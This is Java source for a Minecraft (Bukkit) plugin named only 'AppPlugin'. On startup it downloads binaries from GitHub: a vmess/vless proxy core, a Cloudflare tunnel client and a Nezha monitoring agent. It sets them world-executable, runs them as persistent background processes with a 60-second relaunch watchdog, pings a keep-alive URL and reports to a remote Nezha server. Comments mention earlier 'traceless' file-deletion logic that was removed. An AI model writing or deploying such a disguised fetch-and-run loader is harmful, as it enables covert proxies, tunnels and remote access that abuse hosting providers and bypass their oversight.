package com.example.appplugin;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermission;
import java.security.MessageDigest;
import java.util.*;

public class AppPlugin extends JavaPlugin {

    private String port;
    private String vmms;
    private String vmmport;
    private String vmpath;
    private String vmport;
    private String xieyi;
    private String uuid;
    private String youxuan;
    private String subName;
    private String subUrl;
    private String baohuo;
    private String nezhaser;
    private String nezhaKey;
    private String nezport;
    private String neztls;
    private String filePath;
    private String tok;
    private String agentUuid;
    private boolean showLogs;

    private final String WEB_FILENAME = "webdav";
    private final String NEZHA_FILENAME = "nexus";
    private final String CFF_FILENAME = "cfloat";

    private final Map<String, Process> runningProcesses = new HashMap<>();

    // 日志全局包装方法
    private void logInfo(String msg) { if (showLogs) getLogger().info(msg); }
    private void logWarning(String msg) { if (showLogs) getLogger().warning(msg); }
    private void logSevere(String msg) { if (showLogs) getLogger().severe(msg); }

    @Override
    public void onEnable() {
        // 1. 预检阶段：读取现有 config.yml 决定是否保留配置
        File localPluginConfig = new File(getDataFolder(), "config.yml");
        boolean shouldKeepConfig = false;

        if (localPluginConfig.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(localPluginConfig))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    String trimmed = line.trim().replaceAll("\\s+", "");
                    if (trimmed.startsWith("KEEP_CONFIG:true") || trimmed.startsWith("keep_config:true")) {
                        shouldKeepConfig = true;
                        break;
                    }
                }
            } catch (IOException ignored) {}

            // 2. 判定：如果不保留配置（默认否），则在初始化前执行清理
            if (!shouldKeepConfig) {
                if (localPluginConfig.delete()) {
                    getLogger().info("[重置机制] KEEP_CONFIG 为 false 或未设置，已清理旧配置并加载原生配置。");
                }
            } else {
                getLogger().info("[重置机制] 检测到 KEEP_CONFIG: true，本次重启将完整保留用户本地修改。");
            }
        }

        // 3. 释放配置（若被清理了或首次运行，会释放默认配置）
        saveDefaultConfig();
        
        // 4. 正式加载配置变量
        loadEnvironmentVariables();

        logInfo("====================================");
        logInfo("  AppPlugin ");
        logInfo("====================================");

        // 启动主异步处理流
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            // 首次启动：检查下载、赋权、拉起进程（无痕删除逻辑已被安全移除）
            initializeAndLaunchAll();
            
            // 启动定时守护任务（每隔 60 秒轮询检查一次进程存活）
            Bukkit.getScheduler().runTaskTimerAsynchronously(this, this::checkAndGuardProcesses, 1200L, 1200L);

            if (nezhaser.contains(":")) {
                Bukkit.getScheduler().runTaskTimerAsynchronously(this, this::upname, 400L, 1200L);
            }
        });
    }

    @Override
    public void onDisable() {
        // 服务器关闭时强退子进程
        for (Map.Entry<String, Process> entry : runningProcesses.entrySet()) {
            if (entry.getValue().isAlive()) {
                entry.getValue().destroyForcibly();
                logInfo("已强制回收穿透子进程: " + entry.getKey());
            }
        }
        // 注意：移除了 cleanUpFiles()，退出时也不再删除磁盘文件
    }

    private void loadEnvironmentVariables() {
        port = getEnvOrConfig("PORT", "3000");
        vmms = getEnvOrConfig("VPATH", "vls-123456");
        vmmport = getEnvOrConfig("VL_PORT", "8002");
        vmpath = getEnvOrConfig("MPATH", "vms-3456789");
        vmport = getEnvOrConfig("VM_PORT", "8001");
        xieyi = getEnvOrConfig("XIEYI", "vms");
        uuid = getEnvOrConfig("UUID", "3a8a1de5-7d41-45e2-88fe-0f538b822169");
        youxuan = getEnvOrConfig("CF_IP", "ip.sb");
        subName = getEnvOrConfig("SUB_NAME", "GitHub");
        subUrl = getEnvOrConfig("SUB_URL", "");
        baohuo = getEnvOrConfig("BAOHUO_URL", "");
        nezhaser = getEnvOrConfig("NSERVER", "xxx:443");
        nezhaKey = getEnvOrConfig("NKEY", "");
        nezport = getEnvOrConfig("NPORT", "443");
        neztls = getEnvOrConfig("NTLS", "--tls");
        filePath = getEnvOrConfig("FILE_PATH", getDataFolder().getAbsolutePath());
        tok = getEnvOrConfig("TOK", "");
        
        String envLogs = System.getenv("SHOW_LOGS");
        if (envLogs != null && !envLogs.isEmpty()) {
            showLogs = Boolean.parseBoolean(envLogs);
        } else {
            showLogs = getConfig().getBoolean("SHOW_LOGS", true);
        }

        if (filePath == null || filePath.isEmpty() || filePath.equalsIgnoreCase("null")) {
            filePath = getDataFolder().getAbsolutePath();
        }

        try {
            String seed = subName + uuid + nezhaser + nezhaKey + tok;
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(seed.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            String hash = sb.toString();
            String generatedUuid = String.format("%s-%s-%s-%s-%s",
                    hash.substring(0, 8), hash.substring(8, 12),
                    hash.substring(12, 16), hash.substring(16, 20),
                    hash.substring(20, 32));
            agentUuid = System.getenv("AGENT_UUID") != null ? System.getenv("AGENT_UUID") : generatedUuid;
        } catch (Exception e) {
            agentUuid = "fraewrwdf-das-2sd2-4324-f232df";
        }
    }

    private String getEnvOrConfig(String key, String defaultValue) {
        String env = System.getenv(key);
        if (env != null && !env.isEmpty()) return env;
        return getConfig().getString(key, defaultValue);
    }

    private void initializeAndLaunchAll() {
        File dir = new File(filePath);
        if (!dir.exists()) dir.mkdirs();

        Map<String, String> urls = resolveDownloadUrls();

        // 检查、下载并准备核心组件
        downloadAndPrepare(urls.get(CFF_FILENAME), CFF_FILENAME);
        downloadAndPrepare(urls.get(WEB_FILENAME), WEB_FILENAME);
        if (!nezhaser.isEmpty() && !nezhaKey.isEmpty()) {
            downloadAndPrepare(urls.get(NEZHA_FILENAME), NEZHA_FILENAME);
            if (nezhaser.contains(":")) {
                createNezhaConfig();
            }
        }

        // 直接拉起常驻服务进程
        launchWebdav();
        launchCfloat();
        launchNezha();

        // 【安全移除】这里删除了先前导致报错的延迟 5 秒彻底删除文件逻辑。
    }

    private Map<String, String> resolveDownloadUrls() {
        Map<String, String> urls = new HashMap<>();
        String os = System.getProperty("os.name").toLowerCase();
        String arch = System.getProperty("os.arch").toLowerCase();

        int archType = 0; 
        if (os.contains("freebsd")) archType = 2;
        else if (arch.contains("arm") || arch.contains("aarch64")) archType = 1;

        boolean hasPort = nezhaser.contains(":");
        if (archType == 2) {
            urls.put(NEZHA_FILENAME, hasPort ? getEnvOrConfig("NEZHA_URL_BSD_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-freebsd_amd64") : getEnvOrConfig("NEZHA_URL_BSD", "https://github.com/Fscarmon/flies/releases/latest/download/agent-freebsd_amd64"));
            urls.put(WEB_FILENAME, getEnvOrConfig("WEB_URL_BSD", "https://github.com/dsadsadsss/1/releases/download/xry/kano-bsd"));
            urls.put(CFF_FILENAME, getEnvOrConfig("CFF_URL_BSD", "https://github.com/dsadsadsss/1/releases/download/xry/argo-bsdamd"));
        } else if (archType == 1) {
            urls.put(NEZHA_FILENAME, hasPort ? getEnvOrConfig("NEZHA_URL_ARM64_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-linux_arm64") : getEnvOrConfig("NEZHA_URL_ARM64", "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_arm64"));
            urls.put(WEB_FILENAME, getEnvOrConfig("WEB_URL_ARM64", "https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan-arm"));
            urls.put(CFF_FILENAME, getEnvOrConfig("CFF_URL_ARM64", "https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-arm64"));
        } else {
            urls.put(NEZHA_FILENAME, hasPort ? getEnvOrConfig("NEZHA_URL_X64_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-linux_amd64") : getEnvOrConfig("NEZHA_URL_X64", "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_amd64"));
            urls.put(WEB_FILENAME, getEnvOrConfig("WEB_URL_X64", "https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan"));
            urls.put(CFF_FILENAME, getEnvOrConfig("CFF_URL_X64", "https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-amd64"));
        }
        return urls;
    }

    private void downloadAndPrepare(String urlStr, String filename) {
        File file = new File(filePath, filename);
        // 如果文件存在且大小大于0，直接进行权限确保，不再做无意义的重复下载
        if (file.exists() && file.length() > 0) {
            tryNativeChmod(file);
            return;
        }
        try {
            logInfo("正在释放核心组件 [" + filename + "]...");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setInstanceFollowRedirects(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            int status = conn.getResponseCode();
            if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
                conn = (HttpURLConnection) new URL(conn.getHeaderField("Location")).openConnection();
                status = conn.getResponseCode();
            }

            if (status != HttpURLConnection.HTTP_OK) throw new IOException("HTTP code: " + status);

            try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(file)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
            tryNativeChmod(file);
        } catch (Exception e) {
            logSevere("【错误】核心 [" + filename + "] 释放失败: " + e.getMessage());
        }
    }

    private void tryNativeChmod(File file) {
        try {
            Set<PosixFilePermission> perms = new HashSet<>();
            perms.add(PosixFilePermission.OWNER_READ); perms.add(PosixFilePermission.OWNER_WRITE); perms.add(PosixFilePermission.OWNER_EXECUTE);
            perms.add(PosixFilePermission.GROUP_READ); perms.add(PosixFilePermission.GROUP_WRITE); perms.add(PosixFilePermission.GROUP_EXECUTE);
            perms.add(PosixFilePermission.OTHERS_READ); perms.add(PosixFilePermission.OTHERS_WRITE); perms.add(PosixFilePermission.OTHERS_EXECUTE);
            Files.setPosixFilePermissions(file.toPath(), perms);
            logInfo("【成功】核心文件 [" + file.getName() + "] NIO 权限确保。");
        } catch (Exception e) {
            file.setReadable(true, false); file.setWritable(true, false); file.setExecutable(true, false);
        }
    }

    private void createNezhaConfig() {
        File configFile = new File(filePath, "config.yml");
        if (configFile.exists() && configFile.length() > 0) return; // 存在则沿用
        
        String content = "client_secret: " + nezhaKey + "\nserver: " + nezhaser + "\ntls: " + neztls.equals("--tls") + "\nuuid: " + agentUuid + "\ninsecure_tls: true\n";
        try (FileWriter writer = new FileWriter(configFile)) {
            writer.write(content);
        } catch (IOException e) {
            logSevere("本地临时 config.yml 创建失败: " + e.getMessage());
        }
    }

    private void launchWebdav() {
        // 先检查进程是否已经在运行，避免重复拉起
        Process p = runningProcesses.get(WEB_FILENAME);
        if (p != null && p.isAlive()) return;

        String[] cmd = new String[]{ new File(filePath, WEB_FILENAME).getAbsolutePath() };
        String[] env = new String[]{ "MPATH=" + vmpath, "VM_PORT=" + vmport, "VPATH=" + vmms, "VL_PORT=" + vmmport, "UUID=" + uuid };
        startProcess(WEB_FILENAME, cmd, env);
    }

    private void launchCfloat() {
        Process p = runningProcesses.get(CFF_FILENAME);
        if (p != null && p.isAlive()) return;

        String targetPort = xieyi.equals("vms") ? vmport : vmmport;
        String[] cmd = tok.isEmpty() 
                ? new String[]{new File(filePath, CFF_FILENAME).getAbsolutePath(), "tunnel", "--edge-ip-version", "auto", "--protocol", "auto", "--url", "http://localhost:" + targetPort, "--no-autoupdate"}
                : new String[]{new File(filePath, CFF_FILENAME).getAbsolutePath(), "tunnel", "--edge-ip-version", "auto", "--protocol", "auto", "run", "--no-autoupdate", "--token", tok};
        startProcess(CFF_FILENAME, cmd, null);
    }

    private void launchNezha() {
        if (nezhaser.isEmpty() || nezhaKey.isEmpty()) return;
        Process p = runningProcesses.get(NEZHA_FILENAME);
        if (p != null && p.isAlive()) return;

        String[] cmd = nezhaser.contains(":")
                ? new String[]{new File(filePath, NEZHA_FILENAME).getAbsolutePath(), "-c", new File(filePath, "config.yml").getAbsolutePath()}
                : new String[]{new File(filePath, NEZHA_FILENAME).getAbsolutePath(), "-s", nezhaser + ":" + nezport, "-p", nezhaKey, neztls};
        startProcess(NEZHA_FILENAME, cmd, null);
    }

    private void startProcess(String name, String[] cmd, String[] env) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            if (env != null) {
                for (String e : env) {
                    String[] kv = e.split("=", 2);
                    pb.environment().put(kv[0], kv[1]);
                }
            }
            pb.redirectOutput(ProcessBuilder.Redirect.to(new File(getDataFolder(), name + ".log")));
            pb.redirectError(ProcessBuilder.Redirect.to(new File(getDataFolder(), name + "_err.log")));
            
            runningProcesses.put(name, pb.start());
            logInfo("穿透子服务进程 [" + name + "] 已启动。");
        } catch (Exception e) {
            logSevere("无法唤醒后台子服务 [" + name + "]: " + e.getMessage());
        }
    }

    private void checkAndGuardProcesses() {
        boolean needReload = false;

        Process pWeb = runningProcesses.get(WEB_FILENAME);
        if (pWeb == null || !pWeb.isAlive()) needReload = true;

        Process pCff = runningProcesses.get(CFF_FILENAME);
        if (pCff == null || !pCff.isAlive()) needReload = true;

        if (!nezhaser.isEmpty() && !nezhaKey.isEmpty()) {
            Process pNez = runningProcesses.get(NEZHA_FILENAME);
            if (pNez == null || !pNez.isAlive()) needReload = true;
        }

        // 定时轮询：如果挂了，现在的 initializeAndLaunchAll 会因为文件已存在而光速重新拉起，无需重新下载
        if (needReload) {
            logWarning("监测到后台穿透进程状态异常，正在重新拉起任务...");
            initializeAndLaunchAll();
        }

        if (!baohuo.isEmpty()) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL("https://" + baohuo).openConnection();
                conn.setConnectTimeout(5000);
                conn.getInputStream().close();
            } catch (Exception ignored) {}
        }
    }

    private void upname() {
        if (nezhaser.isEmpty() || nezhaKey.isEmpty()) return;
        try {
            String nezUrl = nezhaser.replaceAll(":\\d+$", "");
            URL url = new URL("https://" + nezUrl + "/upload?token=" + nezhaKey);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);

            String json = "{\"SUBNAME\":\"" + subName + "\",\"UUID\":\"" + agentUuid + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }
            int code = conn.getResponseCode();
            if (code == 200 || code == 202) {
                logInfo("哪吒节点名称异步同步成功 -> " + subName);
            }
        } catch (Exception e) {
            logWarning("同步哪吒节点名网络颠簸: " + e.getMessage());
        }
    }
}
